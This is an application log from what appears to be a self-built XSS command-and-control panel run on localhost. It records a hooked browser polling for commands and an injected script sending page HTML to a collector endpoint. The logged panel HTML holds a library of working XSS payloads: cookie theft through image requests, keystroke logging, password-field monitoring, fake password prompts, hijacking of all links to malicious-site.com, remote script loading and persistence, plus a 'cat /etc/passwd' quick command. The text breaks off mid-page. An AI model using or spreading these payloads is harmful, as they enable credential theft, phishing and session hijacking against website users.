2025-06-26 22:41:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:41:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:18] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:41:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:41:19 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:41:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 1541 bytes [200 OK]>
2025-06-26 22:41:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:19] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:21 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:21 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:21 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:21.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0067s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:21] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:21 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:21 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:21.143005
2025-06-26 22:41:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0088s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:21] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:21] "[31m[1mPOST / HTTP/1.1[0m" 405 -
2025-06-26 22:41:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:21] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:41:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:26 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:26 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:26 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:26.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0090s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:26] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:26 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:26 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:26.145214
2025-06-26 22:41:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0089s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:26] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:31 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:31 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:31 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:31.132Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:31] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:31 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:31 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:31.143609
2025-06-26 22:41:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0068s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:31] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-26 22:41:31 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-26 22:41:31 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-26 22:41:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0049s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>扫描目标管理系统</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n    </body>\n    \n</html>'
2025-06-26 22:41:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:31] "GET / HTTP/1.1" 200 -
2025-06-26 22:41:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:41:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:41:33 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:41:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0013s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 完整頁面HTML: &lt;html&gt;&lt;head&gt;\n    &lt;meta charset=&#34;UTF-8&#34;&gt;\n    &lt;title&gt; My website&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;h1&gt;Hello World&lt;/h1&gt;\n    \\\n    &lt;div class=&#34;comment&#34;&gt;\n        &lt;script src=&#34;http://127.0.0.1:8964/api/control/xss_payload&#34;&gt;&lt;/script&gt;\n    &lt;div&gt;\n   